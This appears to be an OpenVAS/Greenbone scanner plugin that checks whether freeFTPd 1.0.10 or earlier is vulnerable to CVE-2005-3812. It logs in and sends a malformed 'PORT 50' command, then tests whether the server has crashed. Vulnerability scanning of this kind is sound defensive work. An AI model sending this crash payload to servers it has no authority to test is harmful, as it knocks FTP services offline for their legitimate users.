if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802913" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_cve_id( "CVE-2005-3812" );
	script_bugtraq_id( 15557 );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:S/C:N/I:N/A:C" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-07-13 14:06:29 +0530 (Fri, 13 Jul 2012)" );
	script_name( "freeFTPD PORT Command Denial of Service Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/free_ftpd/detected" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/17737" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/1339/" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/417602" );
	script_tag( name: "impact", value: "Successful exploitation allows remote attackers to crash an affected server,
  effectively denying service to legitimate users." );
	script_tag( name: "affected", value: "freeFTPd version 1.0.10 and prior." );
	script_tag( name: "insight", value: "A NULL pointer dereferencing error exists when parsing the parameter of the
  PORT command. Logged on user can send a port command appended with some numbers to crash the server." );
	script_tag( name: "solution", value: "Upgrade to freeFTPd version 1.0.11 or later." );
	script_tag( name: "summary", value: "This host is running FreeFTPD Server and is prone to denial of
  service vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !ContainsString( banner, "I'm freeFTPd" )){
	exit( 0 );
}
soc = open_sock_tcp( ftpPort );
if(!soc){
	exit( 0 );
}
banner = ftp_recv_line( socket: soc );
if(!banner || !ContainsString( banner, "I'm freeFTPd" )){
	ftp_close( socket: soc );
	exit( 0 );
}
kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
login_details = ftp_authenticate( socket: soc, user: user, pass: pass );
if(!login_details){
	ftp_close( socket: soc );
	exit( 0 );
}
data = "PORT 50";
ftp_send_cmd( socket: soc, cmd: data );
ftp_close( socket: soc );
soc2 = open_sock_tcp( ftpPort );
if(!soc2){
	security_message( port: ftpPort );
	exit( 0 );
}
banner = recv( socket: soc2, length: 512 );
if(!banner || !ContainsString( banner, "I'm freeFTPd" )){
	ftp_close( socket: soc2 );
	security_message( port: ftpPort );
	exit( 0 );
}
ftp_close( socket: soc2 );

